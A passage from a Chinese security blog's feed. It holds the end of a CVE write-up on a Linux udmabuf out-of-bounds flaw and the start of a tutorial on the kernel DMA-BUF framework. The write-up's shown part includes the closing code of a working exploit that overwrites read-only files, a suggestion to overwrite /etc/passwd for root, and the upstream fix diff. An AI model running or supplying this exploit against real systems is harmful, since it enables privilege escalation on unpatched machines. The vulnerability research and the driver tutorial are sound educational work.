ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd2) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap udmabuf stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* splicing pipe_buffer */</span><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd1, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd2, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">void</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR], content);<br><br>    <span class="hljs-comment">/* enjoy :) */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Usage: ./exploit target_file_path content&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    proof_of_concept(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行，成功修改只读文件：</p><p><img src="https://s2.loli.net/2025/01/01/tNuw4HksFljrnaT.png"></p><p>有了越权文件读写的权能，在实战当中能够玩的花样就多很多了，例如通过覆写 <code>/etc/passwd</code> 完成提权：）</p><blockquote><p>需要注意的是，<code>pipe_buffer</code> 所使用的分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code> ，在 <code>5.9 ~ 5.14</code> 这个内核版本范围外会使得其与 <code>udmabuf::pages</code> 分配自两个不同的 <code>kmem_cache</code> ，因此若是要在这些版本中利用该漏洞，则你可能需要一些 <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">cross-cache overflow 与内核堆风水的技巧</a></p></blockquote><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>这个漏洞最终在 <a href="https://github.com/torvalds/linux/commit/05b252cccb2e5c3f56119d25de684b4f810ba4">这个 commit</a> 当中被修复，修复方式是在 <code>udmabuf_vm_fault()</code> 当中添加了一个范围检查，笔者个人的感觉是 <em>虽然漏洞是修复了但是修的挺简陋的，不够优雅，因为在笔者看来还应该在 mremap 的调用链当中加入范围检查</em></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/drivers/dma-buf/udmabuf.c b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">index e7330684d3b824..9631f2fd2faf7f 100644</span><br><span class="hljs-comment">--- a/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">+++ b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-meta">@@ -32,8 +32,11 @@</span> static vm_fault_t udmabuf_vm_fault(struct vm_fault *vmf)<br> &#123;<br> struct vm_area_struct *vma = vmf-&gt;vma;<br> struct udmabuf *ubuf = vma-&gt;vm_private_data;<br><span class="hljs-addition">+pgoff_t pgoff = vmf-&gt;pgoff;</span><br> <br><span class="hljs-deletion">-vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];</span><br><span class="hljs-addition">+if (pgoff &gt;= ubuf-&gt;pagecount)</span><br><span class="hljs-addition">+return VM_FAULT_SIGBUS;</span><br><span class="hljs-addition">+vmf-&gt;page = ubuf-&gt;pages[pgoff];</span><br> get_page(vmf-&gt;page);<br> return 0;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linus 哥你骗我们干嘛！这 DMA-BUF 他也不无敌啊！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x06】Linux 共享内存:DMA-BUF 初探（一）</title>
    <link href="https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/"/>
    <id>https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/</id>
    <published>2024-11-30T03:33:42.000Z</published>
    <updated>2024-12-30T22:19:25.687Z</updated>
    
    <content type="html"><![CDATA[<p>世界第一 DMA-BUF 大师是对的！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近刚好看到一个与 DMA buffer 相关的有意思的东西，所以简单写一篇博客记录一下这是个什么玩意：）</p><p>本文涉及到的内核版本为 <code>6.11.2</code> </p><h1 id="0x01-DMA-BUF-简介"><a href="#0x01-DMA-BUF-简介" class="headerlink" title="0x01. DMA-BUF - 简介"></a>0x01. DMA-BUF - 简介</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf 子系统</a> 为不同设备驱动与其他子系统提供了一个方便统一的 <strong>内存共享框架</strong> ，常用于 GPU 及显示驱动等，其主要有三个用于交互的部分：</p><ul><li><code>dma-buf</code> ：表示一个 <code>sg_table</code> ，并作为文件描述符导出到用户空间以允许在进程、子系统、设备间传递（注：UNIX domain socket）</li><li><code>dma-fence</code> ：提供了对异步硬件操作是否完成的检测机制</li><li><code>dma-resv</code> ：为一个特定的 <code>dma-buf</code> 管理一组 <code>dma-fence</code> ，通过隐式的（内核排序的）同步工作以保持表面上的一致访问</li></ul><p>在 dma-buf 框架中主要有两个对象，分别是：</p><ul><li><code>exporter</code> ：共享内存的生产者（内核驱动）<ul><li>负责为内存实现 <code>struct dma_buf_ops</code> 操作函数表</li><li>允许通过 dma_buf API 共享内存</li><li>通过 <code>struct dma_buf</code> 管理内存分配的细节</li><li>决定实际的分配，并负责所有共享用户的 <a href="https://www.wowotech.net/memory_management/scatterlist.html">scatterlist</a> （page 为单位的物理连续内存块）迁移</li></ul></li><li><code>importer/user</code> ：共享内存的消费者（可以是用户态程序也可以是内核态驱动）<ul><li>不关心内存来源</li><li>通过 <code>struct dma_buf_attachment</code> 接口访问共享内存（一般通过共享的文件描述符获取）</li></ul></li></ul><p><img src="https://s2.loli.net/2024/12/20/RUPS1INVcml4kiL.png"></p><!-- ![](https://s2.loli.net/2024/09/19/3Mn475YFeybCXz8.png) --><blockquote><h3 id="扩展阅读：sg-table-与-scatterlist-离散连续内存"><a href="#扩展阅读：sg-table-与-scatterlist-离散连续内存" class="headerlink" title="扩展阅读：sg_table 与 scatterlist - 离散连续内存"></a>扩展阅读：sg_table 与 scatterlist - 离散连续内存</h3><p>简而言之，<strong>单个</strong> <code>scatterlist</code> 用来表示一块 <strong>物理连续</strong> 的 <strong>以页为单位</strong> 的内存块，<code>sg_table</code> 则表示一个离散 <code>scatterlist</code> <strong>数组</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>page_link;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>offset;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>length;<br><span class="hljs-type">dma_addr_t</span>dma_address;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>dma_length;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_FLAGS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    dma_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sgl</span>;</span><span class="hljs-comment">/* the list */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nents;<span class="hljs-comment">/* number of mapped entries */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_nents;<span class="hljs-comment">/* original size of list */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其通常结构如下图所示：</p><p><img src="https://s2.loli.net/2024/09/20/Rr5akvXyLQCbMUd.png" alt="自己画的图"></p><p>对于分配的 scatterlist 数组长度大于一张内存页的情况，其会被分割成多块，其中单张 scatterlist 数组页面上的最后一个成员的 <code>page_link</code> 字段会用于标识是否存在下一份页面以及下一份 scatterlist 页面所在内存页：</p><p><img src="https://s2.loli.net/2024/09/20/V8w2i9QyE7Ndrg5.png" alt="自己画的图"></p></blockquote><p>具体而言，dma-buf 的通常使用流程如下：</p><ul><li><p>exporter 侧用 <code>DEFINE_DMA_BUF_EXPORT_INFO()</code> 创建一个临时 <code>dma_buf_export_info</code> 结构体，并定义导出信息，这通常包括：</p><ul><li><code>::ops</code>：自定义的 <code>struct dma_buf_ops</code> </li><li><code>::priv</code>：自定义私有数据的指针</li><li><code>::size</code> ：共享内存大小</li><li><code>::flags</code> ：内存读写权限</li></ul></li><li><p>exporter 侧调用 <code>dma_buf_export()</code> 创建 <code>dma_buf</code> 对象</p></li><li><p>exporter 侧调用 <code>dma_buf_fd()</code> 将 <code>dma_buf</code> 对象关联到一个新的文件描述符 <code>fd</code> 中（注：使用 fd 进行传递是比较常见的方式，但不唯一）</p></li><li><p>exporter 侧将 <code>fd</code> 传给 importer</p></li><li><p>importer 调用 <code>dma_buf_get(fd)</code> 获取 <code>dma_buf</code> 对象</p></li><li><p>importer 调用 <code>dma_buf_attach()</code> 和 <code>dma_buf_map_attachment()</code> 获取共享缓存的信息</p></li><li><p>importer 使用 <code>sg_table</code> 的内容</p></li><li><p>importer 调用 <code>dma_buf_detach()</code> 和 <code>dma_buf_unmap_attachment()</code> 释放对 <code>dma_buf</code> 的引用</p></li><li><p>importer 调用 <code>dma_buf_put(fd)</code> 释放文件描述符</p></li></ul><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>对于涉及用户态的 DMA-BUF 使用而言，将 <code>dma_buf</code> 封装到 fd 当中通常是必须的：exporter 获取共享内存对应的 <code>dma-buf</code> 的文件描述符 <code>fd</code> ，通过 ioctl 或是 UNIX domain socket 等方式发送给 importer，importer 再 <code>mmap(fd)</code> 以访问共享内存：</p><p><img src="https://s2.loli.net/2024/09/20/5kEc7D8T3gaHw4l.png"></p><blockquote><p>需要注意的是 exporter 与 importer 并不总是分离的，也可以有同时存在于同一驱动的情况（例如 DRM）</p></blockquote><h2 id="dma-buf-结构体"><a href="#dma-buf-结构体" class="headerlink" title="dma_buf 结构体"></a>dma_buf 结构体</h2><p>在 dmabuf 框架中，<code>struct dma_buf</code> 是一个重要的结构体，其用于表示一个共享内存对象，包括内存大小、绑定的文件描述符等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> &#123;</span><br><span class="hljs-type">size_t</span> size;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">attachments</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> vmapping_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iosys_map</span> <span class="hljs-title">vmap_ptr</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *exp_name;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">spinlock_t</span> name_lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list_node</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">void</span> *priv;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_resv</span> *<span class="hljs-title">resv</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> poll;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_poll_cb_t</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_fence_cb</span> <span class="hljs-title">cb</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> *poll;<br><br><span class="hljs-type">__poll_t</span> active;<br>&#125; cb_in, cb_out;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DMABUF_SYSFS_STATS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_sysfs_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br>&#125; *sysfs_entry;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>比较关键的字段如下：</p><ul><li><p><code>size</code> ：共享内存的大小，在 dmabuf 的生命周期中不会发生改变</p></li><li><p><code>file</code> ： 与 dmabuf 相关联的文件描述符，供用户态操作</p></li><li><p><code>attachments</code> ：</p></li><li><p><code>ops</code> ：dmabuf 操作函数表</p></li><li><p><code>priv</code> ：即 private，私有字段，你可以在其中按需存放数据</p></li></ul><p>对于 exporter 侧而言，其需要根据需求自行实现 <code>struct dma_buf_ops</code> 当中的相应操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> &#123;</span><br><span class="hljs-type">int</span> (*attach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">void</span> (*detach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">int</span> (*pin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-type">void</span> (*unpin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> * (*<span class="hljs-title">map_dma_buf</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *,</span><br><span class="hljs-class"> <span class="hljs-title">enum</span> <span class="hljs-title">dma_data_direction</span>);</span><br><span class="hljs-type">void</span> (*unmap_dma_buf)(<span class="hljs-keyword">struct</span> dma_buf_attachment *,<br>      <span class="hljs-keyword">struct</span> sg_table *,<br>      <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> dma_buf *);<br><span class="hljs-type">int</span> (*begin_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*end_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*mmap)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> vm_area_struct *vma);<br><span class="hljs-type">int</span> (*vmap)(<span class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br><span class="hljs-type">void</span> (*vunmap)(<span class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>所有可用操作包括：</p><ul><li><code>attach</code> ：用于建立 dma-buf 与设备间的连接关系，并存放中新创建的 <code>struct dma_buf_attachment</code> 对象中</li><li><code>detach</code> ：</li><li><code>pin</code> ：</li><li><code>unpin</code> ：</li><li><code>map_dma_buf</code> ：</li><li><code>unmap_dma_buf</code> ：</li><li><code>release</code> ：</li><li><code>begin_cpu_access</code> ：</li><li><code>end_cpu_access</code> ：</li><li><code>mmap</code> ：</li><li><code>vmap</code> ：</li><li><code>vunmap</code> ：</li></ul><h1 id="0x02-简易-DMA-BUF-开发"><a href="#0x02-简易-DMA-BUF-开发" class="headerlink" title="0x02. 简易 DMA-BUF 开发"></a>0x02. 简易 DMA-BUF 开发</h1><p>前面讲到 dmabuf 的基本操作序列如下图所示，我们后续将以此为示例进行开发</p><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>需要注意的是 DMA-BUF 相关函数在 <code>DMA_BUF</code> 命名空间中，我们应当在内核模块代码中进行导入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MODULE_IMPORT_NS(DMA_BUF);<br></code></pre></td></tr></table></figure><h2 id="基本的-exporter"><a href="#基本的-exporter" class="headerlink" title="基本的 exporter"></a>基本的 exporter</h2><p>对于 exporter 而言，最重要的是实现 <code>struct dma_buf_ops</code> 中不可或缺的基本操作</p><h3 id="map-dma-buf-：映射-dma-buf-共享内存"><a href="#map-dma-buf-：映射-dma-buf-共享内存" class="headerlink" title="map_dma_buf ：映射 dma-buf 共享内存"></a><code>map_dma_buf</code> ：映射 dma-buf 共享内存</h3><p>该函数指针的作用主要是将 dma-buf 的共享内存进行映射，并将结果写到到一个 <code>sg_table</code> 结构当中，下面是一个最简单的示例，我们假定在此 <code>dma_buf</code> 中已经通过 <code>kmalloc()</code> 分配了内存并存放到 <code>dma_buf::priv</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> sg_table*<br><span class="hljs-title function_">a3exporter_map_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                       <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">table</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">void</span> *err;<br>    <br>    table = kzalloc(<span class="hljs-keyword">sizeof</span>(*table), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!table) &#123;<br>        printk(KERN_ERR<br>               <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for sg_table!\n&quot;</span>);<br>        err = ERR_PTR(-ENOMEM);<br>        <span class="hljs-keyword">goto</span> err_table_no_mem;<br>    &#125;<br><br>    ret = sg_alloc_table(table, <span class="hljs-number">1</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (unlikely(ret)) &#123;    <span class="hljs-comment">/* table will be freed in this function if error */</span><br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate scatterlist!\n&quot;</span>);<br>        err = ERR_PTR(ret);<br>        <span class="hljs-keyword">goto</span> err_sg_alloc;<br>    &#125;<br><br>    buf = attachment-&gt;dmabuf;<br>    sg_dma_len(table-&gt;sgl) = buf-&gt;size;<br>    sg_dma_address(table-&gt;sgl) = dma_map_single(mdev, <span class="hljs-comment">/* cannot be NULL*/</span><br>                                                buf-&gt;priv,<br>                                                buf-&gt;size,<br>                                                direction);<br><br>    <span class="hljs-keyword">if</span> (dma_mapping_error(mdev, sg_dma_address(table-&gt;sgl))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to map for dmabuf!\n&quot;</span>);<br>        err = ERR_PTR(-EFAULT);<br>        <span class="hljs-keyword">goto</span> err_dma_map;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> table;<br><br>err_dma_map:<br>    sg_free_table(table);<br>err_sg_alloc:<br>    kfree(table);<br>err_table_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unmap-dma-buf-：-解除-dma-buf-共享内存映射"><a href="#unmap-dma-buf-：-解除-dma-buf-共享内存映射" class="headerlink" title="unmap_dma_buf ： 解除 dma-buf 共享内存映射"></a><code>unmap_dma_buf</code> ： 解除 dma-buf 共享内存映射</h3><p>这个函数指针的作用主要就是将 <code>sg_table</code> 相关的内存释放掉，并解除掉 dmabuf 的内存映射，下面是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_unmap_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> sg_table *table,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    dma_unmap_single(mdev,<br>                     sg_dma_address(table-&gt;sgl),<br>                     sg_dma_len(table-&gt;sgl),<br>                     direction);<br>    sg_free_table(table);<br>    kfree(table);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="release-：-释放-dma-buf-的内存"><a href="#release-：-释放-dma-buf-的内存" class="headerlink" title="release ： 释放 dma-buf 的内存"></a><code>release</code> ： 释放 dma-buf 的内存</h3><p>该函数指针的作用是真正释放掉 dmabuf 中的内存，下面是一个简单的例子，这里我们假定我们的 dmabuf 中的内存是通过 <code>kmalloc()</code> 进行分配的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf)</span><br>&#123;<br>    kfree(buf-&gt;priv);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="定义-dma-buf"><a href="#定义-dma-buf" class="headerlink" title="定义 dma_buf"></a>定义 <code>dma_buf</code></h3><p>定义了上面这三个函数之后，我们的 <code>dma_buf</code> 的基本功能算是完备了，现在我们可以开始进行 <code>dma_buf</code> 的分配与导出，这里我们给出一个简单的示例，在 exporter 驱动的初始化函数中分配一块常规的内存并包装到 <code>dma_buf</code> 中，为了简化开发流程且方便 importer 驱动使用，这里我们直接将 <code>a3dmabuf</code> 作为一个符号导出：</p><blockquote><p>这里我们在 <code>a3exporter_create_dev()</code> 